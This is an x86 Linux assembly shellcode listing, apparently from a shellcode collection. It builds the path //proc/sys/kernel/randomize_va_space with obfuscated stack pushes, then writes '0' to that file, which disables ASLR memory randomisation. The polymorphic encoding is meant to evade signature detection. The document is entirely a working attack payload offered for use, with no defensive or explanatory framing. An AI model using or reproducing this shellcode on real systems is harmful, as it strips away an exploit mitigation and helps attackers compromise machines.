; Title: Linux x86 ASLR deactivation for Linux/x86 - Polymorphic 
; Author: Daniel Ortiz
; Tested on: Linux 4.18.0-25-generic #26 Ubuntu
; Size: 107 bytes


SECTION .data

        WRITE_SYSCALL equ 4

        CLOSE_SYSCALL equ 6

SECTION .text

global _start



_start: 
        nop
        mov eax, 0xffffffff
        not eax
        push eax
        mov esi, 0x65636170
        push esi
        xor esi, esi
        mov esi, 0x735f6176
        push esi
        xor esi, esi
        push dword 0x5f657a69
        push dword 0x6d6f646e
        push dword 0x61722f6c
        push dword 0x656e7265
        push dword 0x6b2f7379
        push dword 0x732f636f
        
        mov esi, 0x72702f2f
        push esi
        xor esi, esi


        mov ebx,esp 
        mov cx,0x2bc 
        mov al,0x6
        inc al
        inc al
        int 0x80
        mov ebx,eax 
        push eax 
        mov dx,0xb01
        add dx,0x2f2f 
        push dx 
        mov ecx,esp 
        cdq 
        inc edx
        mov al,WRITE_SYSCALL 
        int 0x80
        mov al,CLOSE_SYSCALL
        int 0x80 
 
        mov al, 1
        int 0x80
